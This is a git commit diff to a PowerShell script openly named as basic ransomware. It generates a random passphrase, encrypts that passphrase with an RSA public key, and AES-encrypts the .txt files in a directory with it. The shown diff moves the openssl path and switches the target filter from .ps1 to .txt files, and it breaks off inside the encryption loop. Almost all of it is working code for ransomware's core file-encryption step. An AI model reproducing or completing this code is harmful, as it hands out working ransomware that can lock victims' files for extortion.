10e4bb9766b4262317d17e5732121caa9db8457c
andresgomezvidal <andresgomezvidal@gmail.com>
2019-06-29 16:50:41 +0200

    midway on testing basic ransomware

--- src/ransomware_basic.ps1
+++ src/ransomware_basic.ps1
@@ -1,9 +1,9 @@
-$openssl='C:\Program Files (x86)\GnuWin32\bin\openssl.exe'
+$openssl='C:\temp\openssl\bin\openssl.exe'
 $DIR='c:\temp'
 $PASS=-join ((35..91) + (93..125) | Get-Random -Count 25 | % {[char]$_}) 	#random ascii numbers to chars
-echo "$PASS" | C:\Program' Files (x86)\GnuWin32\bin\'openssl.exe rsautl -encrypt -inkey public.pem -pubin -out passphrase.txt
+echo "$PASS" | ."$openssl" rsautl -encrypt -inkey public.pem -pubin -out passphrase.txt
 
-Get-ChildItem "$DIR" -Filter *.ps1 |
+Get-ChildItem "$DIR" -Filter *.txt |
 Foreach-Object {
 	$file=$_.FullName
 	."$openssl" enc -aes-256-cbc -in "$file" -out "$file.enc" -pass pass:"$PASS"
